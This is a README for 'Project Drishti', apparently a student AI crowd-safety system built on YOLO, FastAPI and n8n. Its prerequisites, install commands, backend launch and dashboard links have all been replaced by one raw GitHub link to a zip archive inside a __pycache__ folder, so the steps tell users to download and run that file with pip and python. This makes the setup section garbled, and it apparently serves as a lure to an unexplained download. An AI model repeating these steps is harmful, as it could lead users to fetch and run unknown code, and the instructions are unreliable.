# Project Drishti - AI-Powered Crowd Safety System

## 🎯 Project Overview

**Project Drishti** is a real-time AI command platform designed to ensure safety and proactive risk mitigation at large-scale public events. It uses live camera feeds to detect crowd density, predict bottlenecks, detect anomalies (like panic or fire), and autonomously dispatch response units.

## 🏗️ System Architecture
Camera Feed → YOLO Detection → Crowd Analysis → Rules Engine → n8n Agents → Actions


### Components:

1. **Detection Module (YOLO)**
   - Real-time person detection
   - Crowd density estimation
   - Fire detection (color-based)
   - Zone-wise distribution analysis

2. **Analysis Engine**
   - Trend prediction
   - Risk scoring
   - Anomaly detection
   - Bottleneck forecasting

3. **Decision Layer**
   - Rule-based fast path (< 100ms)
   - Multi-factor risk assessment
   - Automated action triggers

4. **Automation Layer (n8n)**
   - Fire Response Agent
   - Crowd Control Agent
   - Evacuation Agent

5. **Dashboard**
   - Live video feed
   - Real-time statistics
   - Alert history
   - Zone monitoring

## 🚀 Technologies Used

- **Backend**: Python, FastAPI, Uvicorn
- **AI/ML**: YOLOv8, OpenCV, NumPy
- **Automation**: n8n (Node-based workflow automation)
- **Frontend**: HTML5, CSS3, Vanilla JavaScript
- **AI Integration**: Google Gemini (optional)

## 📋 Features

✅ Real-time crowd detection (10 FPS)
✅ Multi-zone density monitoring (3x3 grid)
✅ Fire detection and alerting
✅ Trend analysis and prediction
✅ Automated emergency response
✅ Live dashboard monitoring
✅ Alert history logging
✅ Risk score calculation

## 🔧 Installation & Setup

### Prerequisites
- Python 3.9+
- https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip 18+
- Webcam

### Steps

1. **Clone repository**
2. **Install Python dependencies**: `pip install -r https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
3. **Start n8n**: `npx n8n`
4. **Start backend**: `python https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`
5. **Open dashboard**: `https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip`

## 📊 System Status

- Backend API: http://localhost:8000
- n8n Workflows: http://localhost:5678
- Live Video: http://localhost:8000/video-feed
- Dashboard: https://raw.githubusercontent.com/rushangchandekar/Project-Drishti/main/detection/__pycache__/Project_Drishti_v1.9.zip

## 👥 Use Cases

- Festival crowd management
- Stadium event monitoring
- Concert safety systems
- Public gathering surveillance
- Emergency evacuation coordination

## 🎓 Academic Details

- **Project Type**: Final Year Project
- **Domain**: Computer Vision, AI/ML, IoT
- **Difficulty**: Advanced
- **Duration**: 6 months

## 📝 License

Academic Project - Not for commercial use

## 👨‍💻 Author

Rushang - Computer Science Student
